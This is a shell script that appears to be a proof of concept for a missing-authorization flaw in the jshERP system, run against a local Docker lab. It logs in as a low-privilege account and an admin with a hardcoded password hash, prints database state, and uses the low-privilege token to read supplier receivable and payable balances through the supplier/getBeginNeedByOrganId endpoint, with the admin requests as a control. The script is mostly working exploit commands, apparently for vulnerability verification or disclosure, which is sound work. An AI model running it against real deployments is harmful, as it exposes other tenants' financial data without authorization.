#!/bin/sh
set -e
BASE='http://127.0.0.1:9999/jshERP-boot'
P='e10adc3949ba59abbe56e057f20f883e'

login_token() {
  user="$1"
  docker exec jsherp33-app sh -lc "curl -s -X POST $BASE/user/login -H 'Content-Type: application/json' -d '{\"loginName\":\"$user\",\"password\":\"$P\"}'" \
  | sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
}

step() {
  echo
  echo "=============================="
  echo "[STEP] $1"
  echo "=============================="
}

run() {
  echo "+ $1"
  sh -c "$1"
}

step "1) 登录获取 token（jsh 与 test123）"
TOKEN_TEST="$(login_token test123)"
TOKEN_JSH="$(login_token jsh)"
echo "test123 token: $TOKEN_TEST"
echo "jsh token: $TOKEN_JSH"

step "2) 查看 test123 的角色功能绑定（数据库状态）"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT id,key_id,type,value,tenant_id FROM jsh_user_business WHERE type='RoleFunctions' AND key_id=17;\\\"\""

step "3) 查看供应商/客户相关功能 ID（数据库状态）"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT id,name,url FROM jsh_function WHERE id IN (25,217,235,237) ORDER BY id;\\\"\""

step "4) 查看将要读取的往来单位数据（数据库状态）"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT id,supplier,type,begin_need_get,begin_need_pay,tenant_id FROM jsh_supplier WHERE id IN (57,58,74) ORDER BY id;\\\"\""

step "5) 用低权限账号 test123 直接读取债务接口"
for id in 57 58 74; do
  echo "organId=$id (attacker=test123)"
  run "docker exec jsherp33-app sh -lc \"curl -s '$BASE/supplier/getBeginNeedByOrganId?organId=$id' -H 'X-Access-Token: $TOKEN_TEST'\""
  echo
done

step "6) 对照组：管理员 jsh 读取同样数据"
for id in 57 58 74; do
  echo "organId=$id (control=jsh)"
  run "docker exec jsherp33-app sh -lc \"curl -s '$BASE/supplier/getBeginNeedByOrganId?organId=$id' -H 'X-Access-Token: $TOKEN_JSH'\""
  echo
done

step "7) 验证接口调用后数据库未变化（数据库状态）"
run "docker exec jsherp33-mysql sh -lc \"mysql -N -ujsherp -p123456 -D jsh_erp -e \\\"SELECT id,supplier,type,begin_need_get,begin_need_pay,tenant_id FROM jsh_supplier WHERE id IN (57,58,74) ORDER BY id;\\\"\""

echo
echo "[Context]"
echo "test123 token: $TOKEN_TEST"
echo "jsh token: $TOKEN_JSH"
